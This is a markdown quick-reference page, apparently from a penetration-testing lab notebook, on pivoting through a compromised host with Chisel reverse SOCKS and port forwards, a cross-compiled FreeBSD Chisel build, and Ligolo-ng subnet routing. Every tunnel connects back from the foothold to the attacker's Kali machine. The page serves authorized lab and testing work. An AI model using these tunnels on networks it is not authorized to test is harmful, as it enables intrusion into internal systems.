# Chisel and Ligolo-ng

[← Pivoting quick reference](../06-pivoting.md)

Chisel = reverse SOCKS/port; Ligolo-ng = subnet route. Record listener, route, subnet.

## Chisel reverse SOCKS

```bash
# Kali
./chisel server -p 8080 --reverse

# Foothold
./chisel client <kali-ip>:8080 R:1080:socks
```

`R:1080:socks` = reverse SOCKS on Kali 1080. Proxychains → `127.0.0.1:1080`; Nmap uses TCP connect. [Syntax](https://github.com/jpillora/chisel#usage).

One internal service exposed on Kali:

```bash
./chisel client <kali-ip>:8080 R:3389:<internal-ip>:3389
```

Confirm service from foothold and which side listens on 3389.

## Cross-compile Chisel

Check the target OS and architecture before downloading or building a client.

```bash
# Target
uname -s
uname -m
```

Chisel is written in Go, so Kali can build a client for another supported platform without a compiler on the target. Pin the same Chisel tag used by the server; otherwise the connection may report a version mismatch.

```bash
# Kali
git clone https://github.com/jpillora/chisel.git chisel-src
cd chisel-src
git checkout <CHISEL-TAG>

# Confirm that the installed Go toolchain supports the requested target.
go tool dist list | grep '^freebsd/'

# FreeBSD on 64-bit x86. Change GOARCH to match the target.
CGO_ENABLED=0 GOOS=freebsd GOARCH=amd64 go build -trimpath \
  -ldflags "-s -w -X github.com/jpillora/chisel/share.BuildVersion=$(git describe --abbrev=0 --tags)" \
  -o chisel-freebsd-amd64 .

file chisel-freebsd-amd64
sha256sum chisel-freebsd-amd64
```

Common mappings are `amd64` or `x86_64` → `GOARCH=amd64`, `i386` → `386`, and `aarch64` → `arm64`. Confirm the combination with `go tool dist list`; FreeBSD and Go version support varies by release. Transfer the binary, then verify it before starting the client:

```sh
chmod +x ./chisel-freebsd-amd64
./chisel-freebsd-amd64 --version
./chisel-freebsd-amd64 client <KALI-IP>:8080 R:1080:socks
```

Current Chisel releases built with the latest Go require FreeBSD 12.2 or newer. For an older target, select a Chisel and Go version that still supports that OS rather than assuming a current binary will run. [Chisel build source](https://github.com/jpillora/chisel) · [Go target variables](https://go.dev/doc/install/source#environment)

## Ligolo-ng

Run the proxy on Kali and the agent on the Windows foothold. This workflow lets
Ligolo create the TUN interface and route from its own console; do not mix it
with the manual `ip tuntap` / `ip route add` method.

```bash
# Kali: start the proxy (default listener: TCP 11601)
sudo ligolo-proxy -selfcert
```

```powershell
# Windows foothold: connect back to Kali's reachable VPN address
.\agent -connect 192.168.45.228:11601 -ignore-cert
```

Replace the Kali IP for each lab. `-ignore-cert` skips certificate validation;
use it only for a controlled lab with the self-signed proxy certificate. After
`Agent joined` appears, enter these commands in the **Ligolo proxy console**:

```text
ifcreate --name pivot
session
tunnel_start --tun pivot
route_add --name pivot --route 172.16.107.0/24
```

Select the Windows agent when `session` prompts.

The example routes the subnet containing `172.16.107.14/24`; use the network
address (`172.16.107.0/24`) for the route, not the host address. Confirm the
agent can reach at least one target on that subnet, then test one known port
from Kali. `Agent joined` proves only the control connection, not that the
tunnel or route works. If an interface or route already exists, check it before
creating a duplicate; Ligolo may retain managed routes in `ligolo-ng.yaml`.

Command names vary by version: this dev build uses `ifcreate` and `route_add`,
while other releases document `interface_create` and `interface_add_route`.
Check the proxy's `help` output if the commands differ. [Ligolo-ng quickstart](https://docs.ligolo.ng/Quickstart/).

Reverse listener through agent: `listener_add`; verify direction with one connection.

Failure: duplicate route, inactive agent, or no foothold reachability. Remove route/listener when done.
